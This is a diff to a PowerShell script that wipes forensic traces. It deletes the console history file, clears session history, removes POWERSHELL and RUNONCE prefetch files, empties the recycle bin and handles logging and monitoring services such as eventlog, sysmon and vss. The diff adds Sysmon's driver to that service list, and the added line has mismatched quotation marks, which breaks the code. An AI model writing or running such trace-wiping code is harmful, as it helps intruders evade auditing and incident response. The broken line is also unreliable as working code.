@@ -61,7 +61,7 @@ Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows
 Clear-History -ErrorAction SilentlyContinue
 
 $services = @(
-    "eventlog","diagtrack","sysmain","sysmon","bam","dam","pcasvc","dps","vss"
+    "eventlog","diagtrack","sysmain","sysmon",","sysmondrv","bam","dam","pcasvc","dps","vss"
 )
 
 foreach ($svc in $services) {
@@ -69,6 +69,7 @@ foreach ($svc in $services) {
     Start-Service -Name $svc -ErrorAction SilentlyContinue
 }
 Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
 Clear-RecycleBin -Force
 Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 Clear-History -ErrorAction SilentlyContinue
